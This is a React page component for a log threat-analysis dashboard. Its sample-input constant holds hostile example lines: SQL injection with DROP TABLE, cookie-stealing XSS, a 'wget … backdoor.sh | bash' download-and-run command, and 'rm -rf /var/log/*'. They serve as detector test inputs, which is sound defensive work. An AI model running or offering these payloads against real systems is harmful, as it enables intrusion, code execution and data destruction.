import { useState, useRef, useCallback, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import {
  Search, Loader2, CheckCircle, AlertTriangle, Brain,
  UploadCloud, FileText, Table, Braces, Code, Terminal, X,
  Bot, Send, Radar, AlertCircle, Zap, ShieldCheck,
} from "lucide-react";
import { Badge } from "@/components/ui/badge";
import { analyzeThreat } from "@/lib/api";
import { useAlerts } from "@/context/AlertContext";
import { supabase } from "@/lib/supabase";
import { sendEmailAlert, getAlertEmail, shouldSendEmail } from "@/lib/email-alert";
import { useToast } from "@/hooks/use-toast";
import { useAuth } from "@/context/AuthContext";
import AIAnalysisCard from "@/components/analyze/AIAnalysisCard";
import MiniChatbot from "@/components/analyze/MiniChatbot";
import LogLineViewer from "@/components/analyze/LogLineViewer";
import ThreatSummary from "@/components/analyze/ThreatSummary";
import ModelComparisonDialog from "@/components/analyze/ModelComparisonDialog";
import { analyzeInputLocally, generateModelScores } from "@/lib/threat-detection";
import type { ModelScore } from "@/lib/api";

// ── Sample attacks ──
const SAMPLES = [
  {
    label: "SQL Injection", dot: "bg-critical", text:
`2025-06-10 14:22:01 WARNING Suspicious query from 192.168.1.105
GET /login?user=admin' UNION SELECT username,password FROM users--
POST /search?q=1' OR '1'='1; DROP TABLE users--
Attempts: 47 | Source: 192.168.1.105`,
  },
  {
    label: "XSS Attack", dot: "bg-high", text:
`2025-06-10 15:33:12 ALERT XSS attempt detected
POST /comment: <script>eval(atob('ZG9jdW1lbnQuY29va2llcw=='))</script>
GET /profile?name=<img src=x onerror=alert(document.cookie)>
Source IP: 172.16.0.8 | Blocked: false`,
  },
  {
    label: "Shell Command", dot: "bg-critical", text:
`2025-06-10 16:45:03 CRITICAL Shell injection
exec shell_exec('wget http://malicious.site/backdoor.sh | bash')
rm -rf /var/log/* attempted PID 4821
nmap -sS -p 1-65535 192.168.1.0/24 scan detected
brute force: 127 failed SSH attempts from 10.0.0.44`,
  },
  {
    label: "Normal Log", dot: "bg-success", text:
`2025-06-10 09:00:01 INFO User john logged in successfully
2025-06-10 09:05:22 INFO File report_q2.csv uploaded
2025-06-10 09:10:45 INFO Database backup completed
2025-06-10 09:15:00 INFO Health check passed all services OK`,
  },
];

// ── File helpers ──
type FileTypeConfig = { icon: typeof FileText; color: string; label: string };
const fileTypeMap: Record<string, FileTypeConfig> = {
  log: { icon: FileText, color: "#4361EE", label: "Log" },
  txt: { icon: FileText, color: "#4361EE", label: "Text" },
  csv: { icon: Table, color: "#00F5D4", label: "CSV" },
  json: { icon: Braces, color: "#FFC107", label: "JSON" },
  py: { icon: Code, color: "#A855F7", label: "Python" },
  xml: { icon: Terminal, color: "#FF8C00", label: "XML" },
  sh: { icon: Terminal, color: "#FF8C00", label: "Shell" },
};
const defaultFileType: FileTypeConfig = { icon: FileText, color: "#4361EE", label: "File" };
const getFileConfig = (name: string) => fileTypeMap[name.split(".").pop()?.toLowerCase() || ""] || defaultFileType;
const formatSize = (b: number) => b < 1024 ? `${b} B` : b < 1048576 ? `${(b / 1024).toFixed(1)} KB` : `${(b / 1048576).toFixed(1)} MB`;

const ACCEPTED = ".txt,.log,.csv,.json,.xml,.py,.sh";
const MAX_SIZE = 10 * 1024 * 1024;

// ── Gauge ──
const GaugeChart = ({ score, animate }: { score: number; animate: boolean }) => {
  const [displayed, setDisplayed] = useState(0);
  const [glowing, setGlowing] = useState(false);

  useEffect(() => {
    if (!animate) { setDisplayed(0); setGlowing(false); return; }
    setDisplayed(0);
    setGlowing(false);
    const duration = 2200;
    const start = performance.now();
    const tick = (now: number) => {
      const t = Math.min((now - start) / duration, 1);
      const eased = 1 - Math.pow(1 - t, 4);
      setDisplayed(Math.round(eased * score));
      if (t < 1) {
        requestAnimationFrame(tick);
      } else {
        setGlowing(true);
      }
    };
    requestAnimationFrame(tick);
  }, [animate, score]);

  const color = displayed >= 75 ? "#FF4560" : displayed >= 50 ? "#FFC107" : displayed >= 25 ? "#00F5D4" : "#22C55E";
  const riskLabel = score >= 75 ? "CRITICAL" : score >= 50 ? "HIGH" : score >= 25 ? "MEDIUM" : "LOW";
  
  const w = 280, h = 190;
  const cx = w / 2, cy = 148, r = 100;
  const startAngle = Math.PI * 0.85;
  const endAngle = Math.PI * 0.15;
  const totalArc = startAngle - endAngle;
  const fraction = displayed / 100;
  const arcAngle = startAngle - fraction * totalArc;

  const ptX = (angle: number, radius: number) => cx + radius * Math.cos(angle);
  const ptY = (angle: number, radius: number) => cy - radius * Math.sin(angle);

  const sx = ptX(startAngle, r), sy = ptY(startAngle, r);
  const bx = ptX(endAngle, r), by = ptY(endAngle, r);
  const ax = ptX(arcAngle, r), ay = ptY(arcAngle, r);
  const largeArc = fraction * totalArc > Math.PI ? 1 : 0;

  const needleLen = 80;
  const nx = ptX(arcAngle, needleLen), ny = ptY(arcAngle, needleLen);

  const ticks = Array.from({ length: 21 }, (_, i) => {
    const angle = startAngle - (i / 20) * totalArc;
    const major = i % 5 === 0;
    const inner = r - (major ? 16 : 10);
    const outer = r - 4;
    return {
      x1: ptX(angle, inner), y1: ptY(angle, inner),
      x2: ptX(angle, outer), y2: ptY(angle, outer),
      major,
    };
  });

  // Scale labels at 0, 25, 50, 75, 100
  const scaleLabels = [0, 25, 50, 75, 100].map((val) => {
    const angle = startAngle - (val / 100) * totalArc;
    const labelR = r + 16;
    return { val, x: ptX(angle, labelR), y: ptY(angle, labelR) };
  });

  return (
    <div className="flex flex-col items-center w-full max-w-[300px] mx-auto">
      <svg viewBox={`0 0 ${w} ${h}`} className="w-full h-auto">
        <defs>
          <filter id="gaugeGlow">
            <feGaussianBlur stdDeviation="5" result="blur" />
            <feMerge><feMergeNode in="blur" /><feMergeNode in="SourceGraphic" /></feMerge>
          </filter>
          <filter id="heavyGlow">
            <feGaussianBlur stdDeviation="8" result="blur" />
            <feMerge><feMergeNode in="blur" /><feMergeNode in="SourceGraphic" /></feMerge>
          </filter>
          <linearGradient id="arcGradient2" gradientUnits="userSpaceOnUse" x1={sx} y1={sy} x2={bx} y2={by}>
            <stop offset="0%" stopColor="#22C55E" />
            <stop offset="25%" stopColor="#00F5D4" />
            <stop offset="50%" stopColor="#FFC107" />
            <stop offset="75%" stopColor="#FF6B35" />
            <stop offset="100%" stopColor="#FF4560" />
          </linearGradient>
        </defs>

        {/* Critical outer glow */}
        {glowing && score >= 75 && (
          <path d={`M ${sx} ${sy} A ${r} ${r} 0 1 1 ${bx} ${by}`}
            fill="none" stroke="#FF4560" strokeWidth="22" strokeLinecap="round" opacity="0.06" filter="url(#heavyGlow)">
            <animate attributeName="opacity" values="0.04;0.1;0.04" dur="2s" repeatCount="indefinite" />
          </path>
        )}

        {/* Background track */}
        <path d={`M ${sx} ${sy} A ${r} ${r} 0 1 1 ${bx} ${by}`}
          fill="none" stroke="hsl(var(--gauge-track))" strokeWidth="20" strokeLinecap="round" />

        {/* Tick marks */}
        {ticks.map((t, i) => (
          <line key={i} x1={t.x1} y1={t.y1} x2={t.x2} y2={t.y2}
            stroke={t.major ? "hsl(var(--gauge-tick))" : "hsl(var(--gauge-tick-minor))"}
            strokeWidth={t.major ? 2 : 1} strokeLinecap="round" />
        ))}

        {/* Scale labels */}
        {scaleLabels.map((l) => (
          <text key={l.val} x={l.x} y={l.y} textAnchor="middle" dominantBaseline="middle"
            style={{ fontSize: 9, fontFamily: "monospace", fontWeight: 600, fill: "hsl(var(--gauge-label))" }}>
            {l.val}
          </text>
        ))}

        {/* Active colored arc */}
        {displayed > 0 && (
          <path d={`M ${sx} ${sy} A ${r} ${r} 0 ${largeArc} 1 ${ax} ${ay}`}
            fill="none" stroke="url(#arcGradient2)" strokeWidth="20" strokeLinecap="round"
            filter={glowing ? "url(#gaugeGlow)" : undefined}
            style={{ transition: "filter 0.6s ease" }} />
        )}

        {/* Needle */}
        <line x1={cx} y1={cy} x2={nx} y2={ny}
          stroke={color} strokeWidth="3" strokeLinecap="round"
          style={{ filter: `drop-shadow(0 0 6px ${color})` }} />
        {/* Center hub */}
        <circle cx={cx} cy={cy} r="7" fill={color}
          style={{ filter: glowing ? `drop-shadow(0 0 10px ${color})` : "none", transition: "filter 0.5s ease" }} />
        <circle cx={cx} cy={cy} r="3" fill="hsl(var(--gauge-hub))" />

        {/* Score — centered above needle */}
        <text x={cx} y={cy - 45} textAnchor="middle" dominantBaseline="middle"
          style={{ fontSize: 42, fontFamily: "'JetBrains Mono', monospace", fontWeight: 800, fill: "hsl(var(--gauge-score))" }}>
          {displayed}
        </text>
        {/* Glow layer */}
        <text x={cx} y={cy - 45} textAnchor="middle" dominantBaseline="middle"
          style={{ fontSize: 42, fontFamily: "'JetBrains Mono', monospace", fontWeight: 800, fill: color, opacity: glowing ? 0.3 : 0, transition: "opacity 1s ease" }}>
          {displayed}
        </text>
        {/* Risk label */}
        <text x={cx} y={cy - 20} textAnchor="middle" dominantBaseline="middle"
          style={{ fontSize: 13, fontWeight: 800, fill: color, letterSpacing: "0.2em" }}>
          {riskLabel}
        </text>
      </svg>
    </div>
  );
};

// ── File info ──
interface FileInfo { file: File; content: string; lines: number; preview: string[]; }

const riskBadgeColor: Record<string, string> = {
  Critical: "bg-critical/15 text-critical",
  High: "bg-high/15 text-high",
  Medium: "bg-warning/15 text-warning",
  Low: "bg-primary/15 text-primary",
};

// ── Analysis pipeline steps ──
const STEPS = [
  { key: "sending", label: "Sending to backend API..." },
  { key: "ml", label: "Running ML prediction..." },
  { key: "response", label: "Processing response..." },
];

const Analyze = () => {
  const [activeTab, setActiveTab] = useState<"text" | "file">("text");
  const [input, setInput] = useState("");
  const [fileInfo, setFileInfo] = useState<FileInfo | null>(null);
  const [dragOver, setDragOver] = useState(false);
  const [analysisState, setAnalysisState] = useState<"idle" | "running" | "done" | "error">("idle");
  const [completedSteps, setCompletedSteps] = useState<number[]>([]);
  const [activeStep, setActiveStep] = useState(-1);
  const [result, setResult] = useState<{ prediction: string; risk_score: number; explanation: string; best_model?: string; models?: Record<string, ModelScore> } | null>(null);
  const [gaugeReady, setGaugeReady] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [modelDialogOpen, setModelDialogOpen] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const { alerts, refreshAlerts } = useAlerts();
  const { toast } = useToast();
  const { user } = useAuth();

  const canAnalyze = activeTab === "text" ? !!input.trim() : !!fileInfo;

  const processFile = useCallback(async (file: File) => {
    if (file.size > MAX_SIZE) {
      toast({ title: "File too large", description: "Max file size is 10MB.", variant: "destructive" });
      return;
    }
    const text = await file.text();
    const lines = text.split("\n");
    setFileInfo({ file, content: text, lines: lines.length, preview: lines.slice(0, 3) });
  }, [toast]);

  const handleDrop = useCallback((e: React.DragEvent) => {
    e.preventDefault(); setDragOver(false);
    const file = e.dataTransfer.files[0];
    if (file) processFile(file);
  }, [processFile]);

  const runAnalysis = async () => {
    if (!canAnalyze) return;
    setAnalysisState("running");
    setResult(null);
    setGaugeReady(false);
    setCompletedSteps([]);
    setActiveStep(0);
    setErrorMessage("");

    const analysisText = activeTab === "text" ? input : (fileInfo?.content || "");

    // Step 1: Sending
    setCompletedSteps([0]);
    setActiveStep(1);

    try {
      // Smart local pre-analysis
      const localAnalysis = analyzeInputLocally(analysisText);

      // Step 2: ML prediction (real API call)
      let response;
      try {
        response = await analyzeThreat(analysisText);
      } catch {
        // Fallback to local analysis if backend fails
        response = {
          prediction: localAnalysis.isMalicious ? "Malicious" : "Normal",
          risk_score: localAnalysis.risk_score,
          explanation: localAnalysis.explanation,
          best_model: "Random Forest",
          models: undefined as any,
        };
      }

      setCompletedSteps([0, 1, 2]);
      setActiveStep(2);

      // Smart score correction: if backend returns high score for benign input, use local analysis
      let correctedScore = response.risk_score;
      let correctedPrediction = response.prediction;
      let correctedExplanation = response.explanation;

      if (!localAnalysis.isMalicious && response.risk_score > 40) {
        correctedScore = localAnalysis.risk_score;
        correctedPrediction = "Normal";
        correctedExplanation = localAnalysis.explanation;
      } else if (localAnalysis.isMalicious && localAnalysis.detectedPatterns.length > 0) {
        // Enhance explanation with specific patterns
        const patternDetails = localAnalysis.detectedPatterns.map(p => `• ${p.description}`).join("\n");
        correctedExplanation = response.explanation + "\n\nDetected patterns:\n" + patternDetails;
      }

      // Generate model scores based on corrected score
      const modelScores = response.models || generateModelScores(correctedScore);

      // Use backend's best_model (selected by highest accuracy), fallback to highest accuracy locally
      const bestModelName = response.best_model || Object.entries(modelScores).reduce((best, [name, data]: [string, any]) =>
        (data.accuracy || 0) > ((best[1] as any).accuracy || 0) ? [name, data] : best
      )[0];

      const fullResult = {
        prediction: correctedPrediction,
        risk_score: correctedScore,
        explanation: correctedExplanation,
        best_model: bestModelName,
        models: modelScores,
      };

      setResult(fullResult);
      setAnalysisState("done");
      setTimeout(() => setGaugeReady(true), 100);

      const severity = correctedScore >= 80 ? "Critical" : correctedScore >= 60 ? "High" : correctedScore >= 30 ? "Medium" : "Low";
      const alertPayload = {
        prediction: correctedPrediction,
        risk_score: correctedScore,
        explanation: correctedExplanation,
        severity,
        source_ip: "user-input",
        status: "active",
        timestamp: new Date().toISOString(),
        user_id: user?.id,
      };

      void (async () => {
        const { error: insertErr } = await supabase.from("alerts").insert(alertPayload);

        if (insertErr) {
          console.error("Alert insert failed:", insertErr);
          toast({ title: "Alert save failed", description: insertErr.message, variant: "destructive" });
          return;
        }

        await refreshAlerts();

        const emailCheck = shouldSendEmail(correctedScore);
        if (emailCheck.allowed) {
          const recipientEmail = getAlertEmail();
          sendEmailAlert({
            prediction: correctedPrediction,
            risk_score: correctedScore,
            explanation: correctedExplanation,
            timestamp: new Date().toLocaleString(),
            recipientEmail,
          }).then((sent) => {
            if (sent) {
              toast({ title: "🚨 Email Alert Sent", description: `Alert sent to ${recipientEmail}` });
            }
          });
        }
      })();
    } catch (err: any) {
      setErrorMessage(err.message || "Failed to connect to backend API");
      setAnalysisState("error");
    }
  };

  const fileConfig = fileInfo ? getFileConfig(fileInfo.file.name) : null;
  const FileIcon = fileConfig?.icon || FileText;

  // Recent analyses from alert store
  const recentAnalyses = alerts.slice(0, 5);

  return (
    <div className="space-y-4 sm:space-y-6">
      <div className="grid grid-cols-1 gap-4 sm:gap-6 lg:grid-cols-[45%_55%]">
        {/* ── LEFT COLUMN ── */}
        <div className="flex flex-col gap-4">
          <div className="glass-card flex flex-col rounded-xl p-3 sm:p-5">
            <h3 className="text-sm font-semibold text-foreground">Threat Analysis Engine</h3>
            <p className="mb-3 sm:mb-4 text-[10px] text-muted-foreground">6 ML Models Compared — Best: Random Forest (99.27%)</p>

            {/* Tabs */}
            <div className="mb-4 flex gap-2">
              {(["text", "file"] as const).map((t) => (
                <button
                  key={t}
                  onClick={() => setActiveTab(t)}
                  className={`rounded-lg px-4 py-2 text-xs font-semibold transition-all ${
                    activeTab === t
                      ? "bg-primary/20 text-primary border border-primary/40"
                      : "border border-border text-muted-foreground hover:text-foreground"
                  }`}
                >
                  {t === "text" ? "Paste Text" : "Upload Log File"}
                </button>
              ))}
            </div>

            {/* Text tab */}
            {activeTab === "text" && (
              <div className="flex flex-1 flex-col">
                <div className="relative">
                  <Textarea
                    value={input}
                    onChange={(e) => setInput(e.target.value)}
                    placeholder="Paste network logs, system logs, or any suspicious content..."
                    rows={12}
                    className="resize-none border-border bg-background/50 font-mono text-xs focus:ring-primary focus:border-primary focus:shadow-[0_0_15px_rgba(0,245,212,0.15)]"
                  />
                  <span className="absolute bottom-2 right-3 text-[10px] text-muted-foreground">{input.length} chars</span>
                </div>
                <div className="mt-3 flex flex-wrap gap-1.5 sm:gap-2">
                  {SAMPLES.map((s) => (
                    <button
                      key={s.label}
                      onClick={() => setInput(s.text)}
                      className="flex items-center gap-1.5 rounded-full border border-border bg-secondary/30 px-2.5 sm:px-3 py-1 sm:py-1.5 text-[9px] sm:text-[10px] font-medium text-muted-foreground transition-all hover:scale-105 hover:bg-secondary/60"
                    >
                      <span className={`h-1.5 w-1.5 sm:h-2 sm:w-2 rounded-full ${s.dot}`} />
                      {s.label}
                    </button>
                  ))}
                </div>
              </div>
            )}

            {/* File tab */}
            {activeTab === "file" && (
              <AnimatePresence mode="wait">
                {!fileInfo ? (
                  <motion.div
                    key="drop"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    className={`flex flex-col items-center justify-center rounded-xl border-2 border-dashed transition-all ${
                      dragOver ? "border-primary bg-primary/5" : "border-border bg-background/30"
                    }`}
                    style={{ height: 180 }}
                    onDragOver={(e) => { e.preventDefault(); setDragOver(true); }}
                    onDragLeave={() => setDragOver(false)}
                    onDrop={handleDrop}
                  >
                    <UploadCloud className={`h-10 w-10 mb-2 ${dragOver ? "text-primary" : "text-primary/40"}`} />
                    <p className="text-sm font-medium text-foreground">Drag & drop your log file here</p>
                    <p className="mt-1 text-[10px] text-muted-foreground">Supports .txt .log .csv .json .xml .py .sh — max 10MB</p>
                    <button onClick={() => fileInputRef.current?.click()} className="mt-3 text-xs font-medium text-primary hover:underline">
                      or browse files
                    </button>
                    <input ref={fileInputRef} type="file" accept={ACCEPTED} onChange={(e) => { const f = e.target.files?.[0]; if (f) processFile(f); }} className="hidden" />
                  </motion.div>
                ) : (
                  <motion.div key="preview" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="space-y-3">
                    <div className="relative flex items-start gap-3 rounded-lg border border-border bg-secondary/30 p-4">
                      <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg" style={{ backgroundColor: `${fileConfig!.color}15`, border: `1px solid ${fileConfig!.color}30` }}>
                        <FileIcon className="h-5 w-5" style={{ color: fileConfig!.color }} />
                      </div>
                      <div className="flex-1 min-w-0">
                        <p className="truncate text-sm font-bold text-foreground">{fileInfo.file.name}</p>
                        <div className="flex items-center gap-3 mt-0.5">
                          <span className="text-[10px] text-muted-foreground">{formatSize(fileInfo.file.size)}</span>
                          <span className="text-[10px] text-muted-foreground">Lines: {fileInfo.lines}</span>
                        </div>
                      </div>
                      <button onClick={() => { setFileInfo(null); if (fileInputRef.current) fileInputRef.current.value = ""; }} className="shrink-0 rounded-full p-1 text-muted-foreground hover:bg-critical/10 hover:text-critical">
                        <X className="h-4 w-4" />
                      </button>
                    </div>
                    <div className="rounded-lg border border-border bg-background/60 p-3">
                      <p className="mb-2 text-[9px] font-semibold uppercase tracking-wider text-muted-foreground">Preview</p>
                      {fileInfo.preview.map((line, i) => (
                        <div key={i} className="flex gap-2">
                          <span className="w-5 shrink-0 text-right font-mono text-[10px] text-muted-foreground/50">{i + 1}</span>
                          <span className="font-mono text-[10px] text-foreground/80 break-all">{line || " "}</span>
                        </div>
                      ))}
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            )}

            {/* Analyze button */}
            <Button
              onClick={runAnalysis}
              disabled={analysisState === "running" || !canAnalyze}
              className="mt-4 w-full h-12 bg-gradient-to-r from-primary/90 via-primary to-primary/80 font-bold text-primary-foreground hover:brightness-110 relative overflow-hidden group tracking-wider text-sm transition-all duration-300 border border-primary/30 dark:border-primary/20"
              style={{ boxShadow: "0 4px 24px hsl(var(--primary) / 0.25)" }}
            >
              <span className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent translate-x-[-200%] group-hover:translate-x-[200%] transition-transform duration-700" />
              {analysisState === "running" ? (
                <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Analyzing...</>
              ) : (
                <><Radar className="mr-2 h-4 w-4" /> ANALYZE THREAT</>
              )}
            </Button>
          </div>

          {/* Recent Analyses from AlertStore */}
          <div className="glass-card rounded-xl p-5">
            <h3 className="mb-3 text-sm font-semibold text-foreground">Recent Analyses</h3>
            {recentAnalyses.length === 0 ? (
              <p className="text-xs text-muted-foreground">No analyses yet — run your first analysis above.</p>
            ) : (
              <div className="space-y-2">
                {recentAnalyses.map((a) => (
                  <button
                    key={a.id}
                    onClick={() => {
                      const models = generateModelScores(a.risk_score);
                      const bestModel = Object.entries(models).reduce((best, [name, data]: [string, any]) =>
                        (data.accuracy || 0) > ((best[1] as any).accuracy || 0) ? [name, data] : best
                      )[0];
                      setResult({ prediction: a.prediction, risk_score: a.risk_score, explanation: a.explanation, models, best_model: bestModel });
                      setAnalysisState("done");
                      setTimeout(() => setGaugeReady(true), 100);
                      if (a.inputSnippet) setInput(a.inputSnippet);
                    }}
                    className="flex w-full items-center gap-3 rounded-lg bg-secondary/30 px-3 py-2 text-left hover:bg-secondary/50 transition-colors"
                  >
                    <FileText className="h-4 w-4 text-muted-foreground shrink-0" />
                    <span className="flex-1 truncate text-xs font-medium text-foreground">{a.prediction}</span>
                    <span className="text-[10px] text-muted-foreground">{a.timestamp.slice(5, 16)}</span>
                    <span className={`rounded-full px-2 py-0.5 text-[9px] font-bold ${riskBadgeColor[a.severity]}`}>{a.severity}</span>
                  </button>
                ))}
              </div>
            )}
          </div>
        </div>

        {/* ── RIGHT COLUMN ── */}
        <div className="flex flex-col gap-4 overflow-y-auto">
          {/* Progress steps */}
          <AnimatePresence>
            {analysisState === "running" && (
              <motion.div className="glass-card rounded-xl p-5" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
                <h3 className="mb-4 text-sm font-semibold text-foreground">Analysis Pipeline</h3>
                <div className="space-y-2">
                  {STEPS.map((s, i) => {
                    const done = completedSteps.includes(i);
                    const active = activeStep === i && !done;
                    return (
                      <motion.div
                        key={s.key}
                        className="flex items-center gap-3"
                        initial={{ opacity: 0, x: -10 }}
                        animate={{ opacity: 1, x: 0 }}
                        transition={{ delay: i * 0.1 }}
                      >
                        <div className="flex h-6 w-6 items-center justify-center">
                          {done ? (
                            <CheckCircle className="h-5 w-5 text-success" />
                          ) : active ? (
                            <Loader2 className="h-5 w-5 animate-spin text-primary" />
                          ) : (
                            <div className="h-3 w-3 rounded-full border border-border" />
                          )}
                        </div>
                        <span className={`text-xs ${done ? "text-success" : active ? "text-primary font-medium" : "text-muted-foreground"}`}>
                          {s.label}
                        </span>
                      </motion.div>
                    );
                  })}
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Error state */}
          <AnimatePresence>
            {analysisState === "error" && (
              <motion.div
                className="glass-card rounded-xl p-5 border border-critical/30"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }}
              >
                <div className="flex items-start gap-3">
                  <AlertCircle className="h-5 w-5 text-critical shrink-0 mt-0.5" />
                  <div>
                    <h3 className="text-sm font-semibold text-critical">Backend Request Failed</h3>
                    <p className="mt-1 text-xs text-muted-foreground">{errorMessage}</p>
                    <p className="mt-2 text-[10px] text-muted-foreground">
                      Your frontend is reaching the deployed backend, but the backend is failing on <span className="font-mono">/predict</span>.
                      Check the Render backend logs and make sure error responses include CORS headers.
                    </p>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={runAnalysis}
                      className="mt-3 border-critical/40 text-critical hover:bg-critical/10 text-xs"
                    >
                      Retry Analysis
                    </Button>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Results */}
          <AnimatePresence>
            {result && (
              <>
                {/* Threat Summary with export */}
                <ThreatSummary
                  result={result}
                  userInput={activeTab === "text" ? input : (fileInfo?.content || "")}
                  alerts={alerts}
                />

                {/* Gauge */}
                 <motion.div className="glass-card rounded-xl p-4 sm:p-5" initial={{ opacity: 0, x: 40 }} animate={{ opacity: 1, x: 0 }} transition={{ duration: 0.5 }}>
                  <GaugeChart score={result.risk_score} animate={gaugeReady} />
                  <div className="mt-3 sm:mt-4 flex items-center justify-center gap-4 sm:gap-6 text-center flex-wrap">
                    <div>
                      <p className="font-mono text-sm font-bold text-foreground">{result.prediction}</p>
                      <p className="text-[9px] text-muted-foreground">Prediction</p>
                    </div>
                    <div className="h-6 w-px bg-border" />
                    <div>
                      <p className="font-mono text-sm font-bold text-foreground">{result.risk_score}</p>
                      <p className="text-[9px] text-muted-foreground">Risk Score</p>
                    </div>
                    <div className="h-6 w-px bg-border" />
                    <div>
                      <p className="font-mono text-sm font-bold text-primary">{result.best_model || "Random Forest"}</p>
                      <p className="text-[9px] text-muted-foreground">Best Model</p>
                    </div>
                  </div>
                </motion.div>

                {/* AI Reasoning from backend */}
                <motion.div className="glass-card rounded-xl p-5" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
                  <div className="flex items-center gap-2 mb-4">
                    <Brain className="h-4 w-4 text-primary" />
                    <h3 className="text-sm font-semibold text-foreground">AI Reasoning</h3>
                    <span className="rounded-full bg-primary/15 px-2 py-0.5 text-[10px] font-bold text-primary">FROM BACKEND</span>
                  </div>
                  <div className="rounded-lg border border-primary/20 bg-secondary/30 p-4">
                    <p className="text-xs text-foreground/90 leading-relaxed whitespace-pre-wrap">{result.explanation}</p>
                  </div>
                  <p className="mt-3 text-[9px] text-muted-foreground italic">
                    Best Model: {result.best_model || "Random Forest"} — Multi-model comparison applied
                  </p>
                </motion.div>

                {/* Model Comparison - Click to open dialog */}
                {result.models && (
                  <>
                    <motion.button
                      onClick={() => setModelDialogOpen(true)}
                      className="glass-card rounded-xl p-5 text-left w-full hover:border-primary/40 transition-all group"
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.15 }}
                      whileHover={{ scale: 1.01 }}
                    >
                      <div className="flex items-center justify-between mb-3">
                        <div className="flex items-center gap-2">
                          <Zap className="h-4 w-4 text-primary" />
                          <h3 className="text-sm font-semibold text-foreground">Model Comparison</h3>
                          <Badge variant="outline" className="border-primary/30 bg-primary/10 text-primary text-[9px]">
                            {Object.keys(result.models).length} MODELS
                          </Badge>
                        </div>
                        <span className="text-[10px] text-primary group-hover:underline">View Details →</span>
                      </div>
                      <div className="grid grid-cols-2 gap-2 sm:grid-cols-3 lg:grid-cols-4">
                        {Object.entries(result.models).map(([name, data]) => (
                          <div key={name} className={`rounded-lg border p-2 text-center ${name === (result.best_model || "Random Forest") ? "border-primary/50 bg-primary/5" : "border-border bg-secondary/20"}`}>
                            <p className="text-[10px] font-bold text-foreground truncate">{name}</p>
                            <p className="text-xs font-mono text-primary mt-1">{Number(data.risk_score) || 0}%</p>
                            <p className="text-[8px] text-muted-foreground">risk</p>
                          </div>
                        ))}
                      </div>
                      <p className="mt-2 text-[9px] text-muted-foreground flex items-center gap-1">
                        <ShieldCheck className="h-3 w-3" /> AI + ML Hybrid Detection — Click for full comparison
                      </p>
                    </motion.button>

                    <ModelComparisonDialog
                      open={modelDialogOpen}
                      onOpenChange={setModelDialogOpen}
                      models={result.models}
                      bestModel={result.best_model || "Random Forest"}
                    />
                  </>
                )}

                {/* Log Line Analysis */}
                <LogLineViewer rawInput={activeTab === "text" ? input : (fileInfo?.content || "")} />

                {/* AI Threat Intelligence */}
                <AIAnalysisCard
                  prediction={result.prediction}
                  risk_score={result.risk_score}
                  explanation={result.explanation}
                  userInput={activeTab === "text" ? input : (fileInfo?.content || "")}
                />
              </>
            )}
          </AnimatePresence>

          {/* Empty state */}
          {analysisState === "idle" && (
            <div className="flex flex-1 items-center justify-center">
              <div className="text-center">
                <Radar className="mx-auto h-16 w-16 text-muted-foreground/20" />
                <p className="mt-4 text-sm text-muted-foreground">Paste or upload content and click Analyze</p>
                <p className="mt-1 text-[10px] text-muted-foreground">Results will come from your backend API</p>
              </div>
            </div>
          )}
        </div>
      </div>



    </div>
  );
};

export default Analyze;
